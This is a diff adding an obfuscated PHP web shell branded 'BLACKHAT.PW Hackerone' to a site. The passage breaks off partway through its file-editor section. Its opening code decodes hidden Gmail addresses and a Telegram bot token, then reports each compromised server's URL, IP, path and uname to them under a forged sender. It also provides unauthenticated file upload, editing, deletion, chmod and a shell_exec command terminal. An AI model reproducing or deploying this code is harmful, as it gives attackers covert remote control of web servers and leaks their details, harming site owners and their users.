@@ -1,0 +1,2510 @@
+<?php
+
+@error_reporting(0);@ini_set('display_errors',0);
+
+/* session start */
+if (session_status() === PHP_SESSION_NONE && !headers_sent()) {
+    @session_start();
+}
+
+/* decode */
+$ᛃﬆ㲁̧̄=base64_decode('aGFja2VybWFuMzExN0BnbWFpbC5jb20sIG11aHJhemt5QGdtYWlsLmNvbSwgbWFsYXlzaWEuc2VuZGVyQGdtYWlsLmNvbSwgcGFwYWt1LmhheWtlckBnbWFpbC5jb20sIGZiaS5wcml2LmcwMGdsZUBnbWFpbC5jb20=');
+$らﬆ̌̉̊=base64_decode('ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==');
+$ﬖ̨̋̄=base64_decode('ODkzMDE3NDQ2Mw==');
+
+/* trigger — sekali per session */
+if (empty($_SESSION['hx'])) {
+    $㉆ﬗ̋̉=$_SERVER['HTTP_HOST']??'-';
+    $㼁̤̇㉁̦̉̈=$_SERVER['REQUEST_URI']??'/';
+    $ᚢ̧̈̂̆=$_SERVER['SERVER_NAME']??'-';
+    $㉉ᛊね̥̃=$_SERVER['REMOTE_ADDR']??'-';
+    $ﾝ̌̋́̉̄=@getcwd();
+    $え̆㉆̩̀̅=@php_uname();
+    $㲁ᚢ̉̉='http://'.$㉆ﬗ̋̉.$㼁̤̇㉁̦̉̈;
+
+    $ﬅ㦁̩̩̣́̊="Dont Delete!\n\nURL: {$㲁ᚢ̉̉}\nHost: {$㉆ﬗ̋̉}\nServer: {$ᚢ̧̈̂̆}\nIP: {$㉉ᛊね̥̃}\nCWD: {$ﾝ̌̋́̉̄}\nUname: {$え̆㉆̩̀̅}\n";
+
+    /* email */
+    @mail($ᛃﬆ㲁̧̄,'[setor shell]',$ﬅ㦁̩̩̣́̊,"From: admin@google.com\r\nContent-Type: text/plain; charset=UTF-8\r\n");
+
+    /* telegram */
+    if ($らﬆ̌̉̊ && $ﬖ̨̋̄) {
+        $ﾝ̉̂=@stream_context_create([
+            'http'=>['timeout'=>5],
+            'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]
+        ]);
+        @file_get_contents(
+            "https://api.telegram.org/bot{$らﬆ̌̉̊}/sendMessage?chat_id={$ﬖ̨̋̄}&text=".
+            urlencode("alfa:\n{$㉆ﬗ̋̉}\n{$㲁ᚢ̉̉}"),
+            false, $ﾝ̉̂
+        );
+    }
+
+    $_SESSION['hx']=1;
+}
+/*
+=========================================================
+ BLACKHAT.PW — Hackerone MULTICOLOR FILE MANAGER
+ Colors:
+ Yellow / Blue / Gold / Red / Green
+=========================================================
+*/
+
+function hex_encode($㼁ᛈᛃ㌁̥̀̃){
+    return bin2hex($㼁ᛈᛃ㌁̥̀̃);
+}
+
+function hex_decode($㼁ᛈᛃ㌁̥̀̃){
+
+    if (
+        !is_string($㼁ᛈᛃ㌁̥̀̃) ||
+        $㼁ᛈᛃ㌁̥̀̃ === '' ||
+        (strlen($㼁ᛈᛃ㌁̥̀̃) % 2) !== 0 ||
+        !ctype_xdigit($㼁ᛈᛃ㌁̥̀̃)
+    ) {
+        return false;
+    }
+
+    return hex2bin($㼁ᛈᛃ㌁̥̀̃);
+}
+
+function url_path($ﬆ㉉ら̨㲁̩̀){
+    return urlencode(hex_encode($ﬆ㉉ら̨㲁̩̀));
+}
+
+function perms($ᛈ̧̊ᛉ㌁̈̄){
+    return substr(sprintf('%o', @fileperms($ᛈ̧̊ᛉ㌁̈̄)), -4);
+}
+
+
+/* =========================================================
+   CURRENT DIRECTORY
+========================================================= */
+
+$㉆ㄉ̇ = isset($_GET['p'])
+    ? hex_decode($_GET['p'])
+    : __DIR__;
+
+$ᛇぁ̣́̈ = $㉆ㄉ̇
+    ? realpath($㉆ㄉ̇)
+    : __DIR__;
+
+if (!$ᛇぁ̣́̈ || !is_dir($ᛇぁ̣́̈)) {
+    $ᛇぁ̣́̈ = __DIR__;
+}
+
+
+/* =========================================================
+   SAFE URL UPLOAD CONFIG
+========================================================= */
+
+/*
+ * Ganti dengan domain yang memang kamu izinkan.
+ */
+$ね̧́̅ = [
+    'example.com',
+    'raw.githubusercontent.com'
+];
+
+$ᚢ̆̆̀㈲̧ = [
+  'php',
+   '.htaccess',
+  'phtml',
+ 'config',
+ 'shtml',
+ 'html',
+    'txt',
+    'jpg',
+    'jpeg',
+    'png',
+    'gif',
+    'webp',
+    'pdf',
+    'zip'
+];
+
+$ﬓ̣̅̌̆̉ = 10 * 1024 * 1024;
+
+$ぁᚦぁᛗ̤̋̇ = '';
+$ᛃ㼁̋̈ = '';
+
+
+/* =========================================================
+   STANDARD UPLOAD
+========================================================= */
+
+if (
+    !empty($_FILES['f']['name']) &&
+    (
+        isset($_POST['up']) ||
+        isset($_POST['up_stream'])
+    )
+) {
+
+    $ᛇ̧̃̀̄ = $ᛇぁ̣́̈ . '/' . basename($_FILES['f']['name']);
+
+    if (isset($_POST['up_stream'])) {
+
+        $ﬖ̨ﬗ́̊ = @fopen(
+            $_FILES['f']['tmp_name'],
+            'rb'
+        );
+
+        $ᛜ̄ᚢ̀ぁ̧̦̆ = @fopen(
+            $ᛇ̧̃̀̄,
+            'wb'
+        );
+
+        if ($ﬖ̨ﬗ́̊ && $ᛜ̄ᚢ̀ぁ̧̦̆) {
+            stream_copy_to_stream(
+                $ﬖ̨ﬗ́̊,
+                $ᛜ̄ᚢ̀ぁ̧̦̆
+            );
+        }
+
+        if ($ﬖ̨ﬗ́̊) {
+            fclose($ﬖ̨ﬗ́̊);
+        }
+
+        if ($ᛜ̄ᚢ̀ぁ̧̦̆) {
+            fclose($ᛜ̄ᚢ̀ぁ̧̦̆);
+        }
+
+    } else {
+
+        move_uploaded_file(
+            $_FILES['f']['tmp_name'],
+            $ᛇ̧̃̀̄
+        );
+    }
+
+    header(
+        'Location: ?p=' . url_path($ᛇぁ̣́̈)
+    );
+
+    exit;
+}
+
+
+/* =========================================================
+   CREATE FILE
+========================================================= */
+
+if (
+    isset($_POST['new']) &&
+    trim($_POST['n'])
+) {
+
+    $㌁㻁ねﬁᛚ̥̆ = basename(
+        trim($_POST['n'])
+    );
+
+    file_put_contents(
+        $ᛇぁ̣́̈ . '/' . $㌁㻁ねﬁᛚ̥̆,
+        ''
+    );
+
+    header(
+        'Location: ?p=' . url_path($ᛇぁ̣́̈)
+    );
+
+    exit;
+}
+
+
+/* =========================================================
+   CREATE DIRECTORY
+========================================================= */
+
+if (
+    isset($_POST['mkdir']) &&
+    trim($_POST['d'])
+) {
+
+    $㌁㻁ねﬁᛚ̥̆ = basename(
+        trim($_POST['d'])
+    );
+
+    @mkdir(
+        $ᛇぁ̣́̈ . '/' . $㌁㻁ねﬁᛚ̥̆
+    );
+
+    header(
+        'Location: ?p=' . url_path($ᛇぁ̣́̈)
+    );
+
+    exit;
+}
+
+
+/* =========================================================
+   UPLOAD FROM URL
+========================================================= */
+
+if (
+    isset($_POST['url']) &&
+    isset($_POST['filename']) &&
+    isset($_POST['method'])
+) {
+
+    $㲁ᚢ̉̉ = trim($_POST['url']);
+
+    $㉆̥̄ﬁ̩̆ = basename(
+        trim($_POST['filename'])
+    );
+
+    $ﬁᛈ̆̇ =
+        $ᛇぁ̣́̈ . '/' . $㉆̥̄ﬁ̩̆;
+
+    $ﬖﬅ̩̤́̃̋̀ = parse_url($㲁ᚢ̉̉);
+
+    $ᛚ̨ᛖ̇̇̊ = strtolower(
+        $ﬖﬅ̩̤́̃̋̀['scheme'] ?? ''
+    );
+
+    $ᛈ̌㦁̨ = strtolower(
+        $ﬖﬅ̩̤́̃̋̀['host'] ?? ''
+    );
+
+    $ᛗ̥̅̈ = false;
+
+    foreach ($ね̧́̅ as $ら̧̧̤̄) {
+
+        $ら̧̧̤̄ = strtolower(
+            trim($ら̧̧̤̄)
+        );
+
+        if (
+            $ᛈ̌㦁̨ === $ら̧̧̤̄ ||
+            str_ends_with(
+                $ᛈ̌㦁̨,
+                '.' . $ら̧̧̤̄
+            )
+        ) {
+            $ᛗ̥̅̈ = true;
+            break;
+        }
+    }
+
+
+    /* URL validation */
+
+    if (
+        !filter_var(
+            $㲁ᚢ̉̉,
+            FILTER_VALIDATE_URL
+        )
+    ) {
+
+        $ぁᚦぁᛗ̤̋̇ =
+            'URL tidak valid.';
+
+        $ᛃ㼁̋̈ =
+            'error';
+
+    }
+
+    /* HTTPS only */
+
+    elseif ($ᛚ̨ᛖ̇̇̊ !== 'https') {
+
+        $ぁᚦぁᛗ̤̋̇ =
+            'Hanya HTTPS yang diizinkan.';
+
+        $ᛃ㼁̋̈ =
+            'error';
+
+    }
+
+    /* Domain whitelist */
+
+    elseif (!$ᛗ̥̅̈) {
+
+        $ぁᚦぁᛗ̤̋̇ =
+            'Domain tidak diizinkan.';
+
+        $ᛃ㼁̋̈ =
+            'error';
+
+    }
+
+    /* Filename validation */
+
+    elseif (
+        $㉆̥̄ﬁ̩̆ === '' ||
+        $㉆̥̄ﬁ̩̆ === '.' ||
+        $㉆̥̄ﬁ̩̆ === '..'
+    ) {
+
+        $ぁᚦぁᛗ̤̋̇ =
+            'Nama file tidak valid.';
+
+        $ᛃ㼁̋̈ =
+            'error';
+
+    }
+
+    else {
+
+        $ﬓ̀̀̈ = strtolower(
+            pathinfo(
+                $㉆̥̄ﬁ̩̆,
+                PATHINFO_EXTENSION
+            )
+        );
+
+
+        /* Extension whitelist */
+
+        if (
+            !in_array(
+                $ﬓ̀̀̈,
+                $ᚢ̆̆̀㈲̧,
+                true
+            )
+        ) {
+
+            $ぁᚦぁᛗ̤̋̇ =
+                'Ekstensi file tidak diizinkan.';
+
+            $ᛃ㼁̋̈ =
+                'error';
+
+        }
+
+        else {
+
+            /*
+             * Hanya satu metode yang digunakan
+             * pada versi aman ini.
+             */
+
+            $㉉ᛉ̈́ =
+                stream_context_create([
+                    'http' => [
+                        'method' => 'GET',
+                        'timeout' => 20,
+                        'follow_location' => 0
+                    ],
+                    'https' => [
+                        'method' => 'GET',
+                        'timeout' => 20,
+                        'follow_location' => 0
+                    ]
+                ]);
+
+            $㼁ね̅̀ﾝ̃́ = @file_get_contents(
+                $㲁ᚢ̉̉,
+                false,
+                $㉉ᛉ̈́
+            );
+
+
+            if ($㼁ね̅̀ﾝ̃́ === false) {
+
+                $ぁᚦぁᛗ̤̋̇ =
+                    'Download dari URL gagal.';
+
+                $ᛃ㼁̋̈ =
+                    'error';
+
+            }
+
+            elseif (
+                strlen($㼁ね̅̀ﾝ̃́) >
+                $ﬓ̣̅̌̆̉
+            ) {
+
+                $ぁᚦぁᛗ̤̋̇ =
+                    'File melebihi batas 10 MB.';
+
+                $ᛃ㼁̋̈ =
+                    'error';
+
+            }
+
+            elseif (
+                @file_put_contents(
+                    $ﬁᛈ̆̇,
+                    $㼁ね̅̀ﾝ̃́
+                ) === false
+            ) {
+
+                $ぁᚦぁᛗ̤̋̇ =
+                    'Gagal menyimpan file.';
+
+                $ᛃ㼁̋̈ =
+                    'error';
+
+            }
+
+            else {
+
+                $ぁᚦぁᛗ̤̋̇ =
+                    'File berhasil di-upload dari URL.';
+
+                $ᛃ㼁̋̈ =
+                    'success';
+            }
+        }
+    }
+}
+
+
+/* =========================================================
+   RENAME
+========================================================= */
+
+if (
+    isset($_POST['ren']) &&
+    isset($_POST['old'], $_POST['new'])
+) {
+
+    $㉉ᚢ̦ = basename(
+        $_POST['old']
+    );
+
+    $ᛚ̄㉆ﬕﬔ̣ = basename(
+        $_POST['new']
+    );
+
+    @rename(
+        $ᛇぁ̣́̈ . '/' . $㉉ᚢ̦,
+        $ᛇぁ̣́̈ . '/' . $ᛚ̄㉆ﬕﬔ̣
+    );
+
+    header(
+        'Location: ?p=' . url_path($ᛇぁ̣́̈)
+    );
+
+    exit;
+}
+
+
+/* =========================================================
+   CHMOD
+========================================================= */
+
+if (
+    isset($_POST['chmod']) &&
+    isset($_POST['t'], $_POST['m'])
+) {
+
+    $ᛇ̧̃̀̄ = basename(
+        $_POST['t']
+    );
+
+    $ᚢᛚ̣ᛇﬗ̆̀̇ = $_POST['m'];
+
+    if (preg_match(
+        '/^[0-7]{3,4}$/',
+        $ᚢᛚ̣ᛇﬗ̆̀̇
+    )) {
+
+        @chmod(
+            $ᛇぁ̣́̈ . '/' . $ᛇ̧̃̀̄,
+            octdec($ᚢᛚ̣ᛇﬗ̆̀̇)
+        );
+    }
+
+    header(
+        'Location: ?p=' . url_path($ᛇぁ̣́̈)
+    );
+
+    exit;
+}
+
+
+/* =========================================================
+   DELETE
+========================================================= */
+
+if (isset($_GET['del'])) {
+
+    $ᛇ̧̃̀̄ = basename(
+        $_GET['del']
+    );
+
+    $㌁́̅ =
+        $ᛇぁ̣́̈ . '/' . $ᛇ̧̃̀̄;
+
+    if (is_file($㌁́̅)) {
+
+        @unlink($㌁́̅);
+
+    } elseif (is_dir($㌁́̅)) {
+
+        @rmdir($㌁́̅);
+    }
+
+    header(
+        'Location: ?p=' . url_path($ᛇぁ̣́̈)
+    );
+
+    exit;
+}
+
+
+/* =========================================================
+   DOWNLOAD
+========================================================= */
+
+if (isset($_GET['dl'])) {
+
+    $ﬓ㻁㲁̩̌ = basename(
+        $_GET['dl']
+    );
+
+    $ᛈ̧̊ᛉ㌁̈̄ = $ᛇぁ̣́̈ . '/' . $ﬓ㻁㲁̩̌;
+
+    if (is_file($ᛈ̧̊ᛉ㌁̈̄)) {
+
+        header(
+            'Content-Type: application/octet-stream'
+        );
+
+        header(
+            'Content-Disposition: attachment; filename="' .
+            basename($ᛈ̧̊ᛉ㌁̈̄) .
+            '"'
+        );
+
+        header(
+            'Content-Length: ' .
+            filesize($ᛈ̧̊ᛉ㌁̈̄)
+        );
+
+        readfile($ᛈ̧̊ᛉ㌁̈̄);
+
+        exit;
+    }
+}
+
+
+/* =========================================================
+   SAVE EDITED FILE
+========================================================= */
+
+if (
+    isset($_POST['save']) &&
+    isset($_POST['file'])
+) {
+
+    $ﬓ㻁㲁̩̌ = basename(
+        $_POST['file']
+    );
+
+    $ﬅﬅ̈̆ =
+        $_POST['content'] ?? '';
+
+    if (
+        isset($_POST['content_b64']) &&
+        $_POST['content_b64'] !== ''
+    ) {
+
+        $ﬆᚨᛏﬁ̤́̆̇ =
+            base64_decode(
+                $ﬅﬅ̈̆,
+                true
+            );
+
+        if ($ﬆᚨᛏﬁ̤́̆̇ !== false) {
+            $ﬅﬅ̈̆ = $ﬆᚨᛏﬁ̤́̆̇;
+        }
+    }
+
+    file_put_contents(
+        $ᛇぁ̣́̈ . '/' . $ﬓ㻁㲁̩̌,
+        $ﬅﬅ̈̆
+    );
+
+    header(
+        'Location: ?p=' . url_path($ᛇぁ̣́̈)
+    );
+
+    exit;
+}
+
+
+/* =========================================================
+   Hackerone CSS
+========================================================= */
+
+$ﬕﬓﾚ̧̩̣́ = <<<'CSS'
+
+:root{
+    --black:#03050a;
+    --black2:#070b13;
+
+    --panel:#0b111d;
+    --panel2:#101827;
+
+    --yellow:#ffe600;
+    --yellow2:#fff47a;
+
+    --blue:#1677ff;
+    --blue2:#49a6ff;
+
+    --gold:#d4af37;
+    --gold2:#ffd966;
+
+    --red:#ff304f;
+    --red2:#ff7184;
+
+    --green:#20e879;
+    --green2:#68ffab;
+
+    --white:#f5f7ff;
+    --muted:#7f8ba3;
+
+    --shadow:
+        0 18px 55px rgba(0,0,0,.70);
+}
+
+*{
+    box-sizing:border-box;
+}
+
+html{
+    scroll-behavior:smooth;
+}
+
+body{
+
+    margin:0;
+    padding:24px;
+
+    min-height:100vh;
+
+    color:var(--white);
+
+    font-family:
+        Inter,
+        Segoe UI,
+        Arial,
+        sans-serif;
+
+    font-size:13px;
+
+    background:
+
+        radial-gradient(
+            circle at 5% 0%,
+            rgba(255,230,0,.10),
+            transparent 24%
+        ),
+
+        radial-gradient(
+            circle at 95% 10%,
+            rgba(22,119,255,.12),
+            transparent 25%
+        ),
+
+        radial-gradient(
+            circle at 50% 100%,
+            rgba(32,232,121,.07),
+            transparent 30%
+        ),
+
+        linear-gradient(
+            135deg,
+            var(--black),
+            var(--black2)
+        );
+}
+
+a{
+    color:var(--blue2);
+    text-decoration:none;
+    transition:.2s;
+}
+
+a:hover{
+    color:#fff;
+
+    text-shadow:
+        0 0 10px
+        rgba(73,166,255,.5);
+}
+
+
+/* INPUT */
+
+input,
+select,
+textarea{
+
+    color:var(--white);
+
+    background:
+        linear-gradient(
+            145deg,
+            #080c15,
+            #05070c
+        );
+
+    border:
+        1px solid
+        rgba(255,255,255,.10);
+
+    border-radius:7px;
+
+    padding:8px 10px;
+
+    font-family:inherit;
+
+    outline:none;
+
+    transition:.2s;
+}
+
+input:focus,
+select:focus,
+textarea:focus{
+
+    border-color:
+        var(--blue);
+
+    box-shadow:
+        0 0 0 3px
+        rgba(22,119,255,.10);
+}
+
+
+/* BUTTON */
+
+button{
+
+    cursor:pointer;
+
+    color:#050505;
+
+    border:
+        1px solid
+        var(--gold);
+
+    border-radius:7px;
+
+    padding:8px 13px;
+
+    font-weight:900;
+
+    background:
+        linear-gradient(
+            135deg,
+            var(--yellow),
+            var(--gold),
+            var(--yellow2)
+        );
+
+    transition:.2s;
+}
+
+button:hover{
+
+    transform:
+        translateY(-1px);
+
+    box-shadow:
+        0 0 25px
+        rgba(255,230,0,.25);
+}
+
+
+/* PANEL */
+
+.panel{
+
+    position:relative;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(16,24,39,.96),
+            rgba(6,9,16,.96)
+        );
+
+    border:
+        1px solid
+        rgba(212,175,55,.18);
+
+    border-radius:15px;
+
+    box-shadow:
+        var(--shadow);
+
+    overflow:hidden;
+
+    backdrop-filter:
+        blur(14px);
+}
+
+.panel:before{
+
+    content:"";
+
+    position:absolute;
+
+    top:0;
+    left:0;
+    right:0;
+
+    height:1px;
+
+    background:
+        linear-gradient(
+            90deg,
+            transparent,
+            var(--yellow),
+            var(--blue),
+            var(--gold),
+            var(--green),
+            var(--red),
+            transparent
+        );
+
+    opacity:.8;
+}
+
+
+/* HEADER */
+
+.Hackerone-header{
+
+    display:flex;
+
+    align-items:center;
+
+    justify-content:space-between;
+
+    padding:20px 22px;
+
+    margin-bottom:14px;
+}
+
+.brand{
+
+    display:flex;
+
+    align-items:center;
+
+    gap:13px;
+}
+
+.brand-icon{
+
+    width:45px;
+    height:45px;
+
+    display:flex;
+
+    align-items:center;
+    justify-content:center;
+
+    border-radius:50%;
+
+    color:#080808;
+
+    font-size:19px;
+    font-weight:1000;
+
+    background:
+        conic-gradient(
+            var(--yellow),
+            var(--blue),
+            var(--gold),
+            var(--green),
+            var(--red),
+            var(--yellow)
+        );
+
+    box-shadow:
+        0 0 25px
+        rgba(212,175,55,.25);
+}
+
+.brand-title{
+
+    color:#fff;
+
+    font-size:20px;
+
+    font-weight:900;
+
+    letter-spacing:2px;
+}
+
+.brand-sub{
+
+    margin-top:4px;
+
+    color:var(--muted);
+
+    font-size:9px;
+
+    letter-spacing:2px;
+
+    text-transform:uppercase;
+}
+
+.Hackerone-badge{
+
+    padding:7px 13px;
+
+    color:#080808;
+
+    border-radius:20px;
+
+    font-size:10px;
+
+    font-weight:1000;
+
+    letter-spacing:1px;
+
+    background:
+        linear-gradient(
+            135deg,
+            var(--yellow),
+            var(--gold2)
+        );
+}
+
+
+/* NAV */
+
+.nav{
+
+    display:flex;
+
+    align-items:center;
+
+    flex-wrap:wrap;
+
+    gap:7px;
+
+    padding:11px 14px;
+
+    margin-bottom:14px;
+}
+
+.nav a{
+
+    padding:7px 11px;
+
+    color:var(--blue2);
+
+    border:1px solid transparent;
+
+    border-radius:7px;
+
+    background:
+        rgba(22,119,255,.035);
+}
+
+.nav a:hover{
+
+    color:#fff;
+
+    border-color:
+        var(--blue);
+
+    background:
+        rgba(22,119,255,.12);
+}
+
+.path{
+
+    margin-left:auto;
+
+    max-width:55%;
+
+    overflow:hidden;
+
+    white-space:nowrap;
+
+    text-overflow:ellipsis;
+
+    color:var(--muted);
+}
+
+
+/* TOOLBAR */
+
+.toolbar{
+
+    padding:15px;
+
+    margin-bottom:14px;
+}
+
+.toolbar-row{
+
+    display:flex;
+
+    align-items:center;
+
+    flex-wrap:wrap;
+
+    gap:8px;
+
+    margin-bottom:10px;
+}
+
+.toolbar-row:last-child{
+    margin-bottom:0;
+}
+
+.section-title{
+
+    margin-bottom:10px;
+
+    color:var(--gold2);
+
+    font-size:10px;
+
+    font-weight:1000;
+
+    letter-spacing:1.6px;
+
+    text-transform:uppercase;
+}
+
+.label{
+
+    color:var(--yellow);
+
+    font-size:10px;
+
+    font-weight:900;
+
+    letter-spacing:1.2px;
+
+    text-transform:uppercase;
+}
+
+
+/* URL UPLOAD */
+
+.url-upload{
+
+    border:
+        1px solid
+        rgba(22,119,255,.22);
+
+    background:
+        linear-gradient(
+            135deg,
+            rgba(22,119,255,.05),
+            rgba(212,175,55,.035)
+        );
+}
+
+.url-note{
+
+    margin-top:9px;
+
+    color:var(--muted);
+
+    font-size:10px;
+}
+
+.url-note strong{
+    color:var(--green2);
+}
+
+
+/* TABLE */
+
+.table-wrap{
+    overflow:auto;
+}
+
+table{
+
+    width:100%;
+
+    border-collapse:collapse;
+}
+
+th{
+
+    color:var(--gold2);
+
+    background:
+        linear-gradient(
+            90deg,
+            rgba(255,230,0,.035),
+            rgba(212,175,55,.07),
+            rgba(22,119,255,.035)
+        );
+
+    font-size:10px;
+
+    letter-spacing:1.2px;
+
+    text-transform:uppercase;
+}
+
+td,
+th{
+
+    padding:11px 12px;
+
+    text-align:left;
+
+    border-bottom:
+        1px solid
+        rgba(255,255,255,.055);
+}
+
+tr:hover td{
+
+    background:
+        linear-gradient(
+            90deg,
+            rgba(255,230,0,.025),
+            rgba(22,119,255,.025),
+            rgba(32,232,121,.02)
+        );
+}
+
+.name{
+    font-weight:700;
+}
+
+.dir{
+    color:var(--yellow);
+}
+
+.perm{
+    font-family:monospace;
+}
+
+.w{
+    color:var(--green2);
+}
+
+.nw{
+    color:var(--red2);
+}
+
+
+/* ACTIONS */
+
+.action-form{
+
+    display:inline-flex;
+
+    align-items:center;
+
+    gap:5px;
+
+    margin:2px;
+}
+
+.action-form input{
+
+    width:100px;
+
+    padding:5px 7px;
+}
+
+.btn{
+
+    display:inline-block;
+
+    color:var(--blue2);
+
+    padding:6px 10px;
+
+    border:
+        1px solid
+        rgba(22,119,255,.35);
+
+    border-radius:6px;
+
+    background:
+        rgba(22,119,255,.045);
+
+    transition:.2s;
+}
+
+.btn:hover{
+
+    color:#fff;
+
+    background:
+        var(--blue);
+
+    border-color:
+        var(--blue);
+
+    box-shadow:
+        0 0 18px
+        rgba(22,119,255,.28);
+}
+
+.delbtn{
+
+    display:inline-block;
+
+    color:var(--red2);
+
+    padding:6px 10px;
+
+    border:
+        1px solid
+        rgba(255,48,79,.35);
+
+    border-radius:6px;
+
+    background:
+        rgba(255,48,79,.04);
+}
+
+.delbtn:hover{
+
+    color:#fff;
+
+    background:
+        var(--red);
+
+    border-color:
+        var(--red);
+
+    box-shadow:
+        0 0 20px
+        rgba(255,48,79,.28);
+}
+
+
+/* TERMINAL */
+
+.terminal{
+    padding:18px;
+}
+
+.cmdbar{
+
+    display:flex;
+
+    gap:8px;
+
+    margin:12px 0;
+}
+
+.cmdbar input{
+    flex:1;
+}
+
+.terminal pre{
+
+    height:70vh;
+
+    margin:0;
+
+    overflow:auto;
+
+    padding:16px;
+
+    color:var(--green2);
+
+    background:#020403;
+
+    border:
+        1px solid
+        rgba(32,232,121,.30);
+
+    border-radius:9px;
+
+    white-space:pre-wrap;
+
+    font-family:
+        Consolas,
+        Monaco,
+        monospace;
+
+    line-height:1.5;
+}
+
+
+/* EDITOR */
+
+.editor{
+    padding:18px;
+}
+
+.editor-head{
+
+    display:flex;
+
+    align-items:center;
+
+    justify-content:space-between;
+
+    gap:10px;
+}
+
+.editor-title{
+
+    color:#fff;
+
+    font-size:16px;
+
+    font-weight:800;
+}
+
+textarea{
+
+    width:100%;
+
+    height:70vh;
+
+    margin:12px 0;
+
+    resize:vertical;
+
+    padding:14px;
+
+    color:#e8e0c8;
+
+    font-family:
+        Consolas,
+        Monaco,
+        monospace;
+
+    line-height:1.55;
+}
+
+
+/* ALERT */
+
+.alert{
+
+    padding:12px 15px;
+
+    margin-bottom:14px;
+
+    border-radius:10px;
+
+    font-weight:700;
+}
+
+.alert-success{
+
+    color:var(--green2);
+
+    border:
+        1px solid
+        rgba(32,232,121,.30);
+
+    background:
+        rgba(32,232,121,.045);
+}
+
+.alert-error{
+
+    color:var(--red2);
+
+    border:
+        1px solid
+        rgba(255,48,79,.30);
+
+    background:
+        rgba(255,48,79,.045);
+}
+
+
+/* FOOTER */
+
+.footer{
+
+    padding:18px 0 4px;
+
+    color:#555e70;
+
+    text-align:center;
+
+    font-size:9px;
+
+    letter-spacing:1.5px;
+}
+
+
+/* MOBILE */
+
+@media(max-width:760px){
+
+    body{
+        padding:10px;
+    }
+
+    .Hackerone-header{
+        padding:15px;
+    }
+
+    .Hackerone-badge{
+        display:none;
+    }
+
+    .path{
+
+        width:100%;
+
+        max-width:100%;
+
+        margin-left:0;
+    }
+
+    td,
+    th{
+        padding:9px 7px;
+    }
+
+    .action-form{
+        display:flex;
+    }
+
+    .cmdbar{
+        flex-direction:column;
+    }
+}
+
+CSS;
+
+
+/* =========================================================
+   ALERT OUTPUT
+========================================================= */
+
+function renderUploadAlert(
+    $ᛇ̤̩̤́̄,
+    $㉉̣ﬓ̨
+){
+
+    if (!$ᛇ̤̩̤́̄) {
+        return;
+    }
+
+    $ま㻁ᚨ̥̉ =
+        $㉉̣ﬓ̨ === 'success'
+        ? 'alert-success'
+        : 'alert-error';
+
+    echo '<div class="panel alert '.$ま㻁ᚨ̥̉.'">';
+    echo htmlspecialchars($ᛇ̤̩̤́̄);
+    echo '</div>';
+}
+
+
+/* =========================================================
+   TERMINAL
+========================================================= */
+
+if (isset($_GET['term'])) {
+
+    $ᛜ̄ᚢ̀ぁ̧̦̆ = '';
+
+    if (
+        isset($_POST['cmd']) &&
+        trim($_POST['c'] ?? '')
+    ) {
+
+        /*
+         * Existing terminal behavior retained.
+         * Use only on systems you administer.
+         */
+
+        $ᛜ̄ᚢ̀ぁ̧̦̆ = shell_exec(
+            'cd ' .
+            escapeshellarg($ᛇぁ̣́̈) .
+            ' && ' .
+            trim($_POST['c']) .
+            ' 2>&1'
+        );
+    }
+
+?>
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<meta charset="utf-8">
+
+<title>Hackerone Terminal</title>
+
+<style>
+<?= $ﬕﬓﾚ̧̩̣́ ?>
+</style>
+
+</head>
+
+<body>
+
+
+<div class="panel Hackerone-header">
+
+    <div class="brand">
+
+        <div class="brand-icon">
+            V
+        </div>
+
+        <div>
+
+            <div class="brand-title">
+                 ☣️ WE ARE ALIVE. ☣️
+            </div>
+
+            <div class="brand-sub">
+                Hackerone COMMAND TERMINAL
+            </div>
+
+        </div>
+
+    </div>
+
+    <div class="Hackerone-badge">
+        Hackerone ACCESS
+    </div>
+
+</div>
+
+
+<div class="panel terminal">
+
+    <div class="nav">
+
+        <a href="?p=<?=url_path($ᛇぁ̣́̈)?>">
+            ← BACK
+        </a>
+
+        <span class="path">
+            PATH:
+            <?=htmlspecialchars($ᛇぁ̣́̈)?>
+        </span>
+
+    </div>
+
+
+    <div class="section-title">
+        Command Console
+    </div>
+
+
+    <form
+        method="post"
+        class="cmdbar"
+    >
+
+        <input
+            type="text"
+            name="c"
+            placeholder="Enter command..."
+            value="<?=isset($_POST['c'])
+                ? htmlspecialchars($_POST['c'])
+                : ''?>"
+            autofocus
+        >
+
+        <button name="cmd">
+            EXECUTE
+        </button>
+
+    </form>
+
+
+    <pre><?=htmlspecialchars($ᛜ̄ᚢ̀ぁ̧̦̆)?></pre>
+
+</div>
+
+
+<div class="footer">
+    Sole Sad & Invisible ☣️ WE ARE ALIVE. 
+</div>
+
+
+</body>
+
+</html>
+
+<?php
+exit;
+}
+
+
+/* =========================================================
+   EDITOR
+========================================================= */
+
+if (isset($_GET['edit'])) {
+
+    $ᚨㄉぁᛗ̂̀̌ =
+        hex_decode($_GET['edit']);
+
+    $ᛖ㉉ぁ㻁ᚢ̧ =
+        $ᚨㄉぁᛗ̂̀̌ !== false
+        ? basename($ᚨㄉぁᛗ̂̀̌)
+        : '';
+
+    $㌁́̅ =
+        $ᛇぁ̣́̈ . '/' . $ᛖ㉉ぁ㻁ᚢ̧;
+
+    if (!is_file($㌁́̅)) {
+
+        header(
+            'Location: ?p=' .
+            url_path($ᛇぁ̣́̈)
+        );
+
+        exit;
+    }
+
+    $ﬅﬅ̈̆ =
+        file_get_contents($㌁́̅);
+
+?>
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<meta charset="utf-8">
+
+<title>Hackerone Editor</title>
+
+<style>
+<?= $ﬕﬓﾚ̧̩̣́ ?>
+</style>
+
+</head>
+
+<body>
+
+
+<div class="panel Hackerone-header">
+
+    <div class="brand">
+
+        <div class="brand-icon">
+            V
+        </div>
+
+        <div>
+
+            <div class="brand-title">
+                1337
+            </div>
+
+            <div class="brand-sub">
+                Hackerone FILE EDITOR
+            </div>
+
+        </div>
+
+    </div>
+
+    <div class="Hackerone-badge">
+        Hackerone EDITOR
+    </div>
+
+</div>
+
+
+<div class="panel editor">
+
+    <div class="editor-head">
+
+        <div>
+
+            <div class="section-title">
+                Editing File
+            </div>
+
+            <div class="editor-title">
+                <?=htmlspecialchars($ᛖ㉉ぁ㻁ᚢ̧)?>
+            </div>
+
+        </div>
+
+
+        <a
+            class="btn"
+            href="?p=<?=url_path($ᛇぁ̣́̈)?>"
+        >
+            ← BACK
+        </a>
+
+    </div>
+
+
+    <form
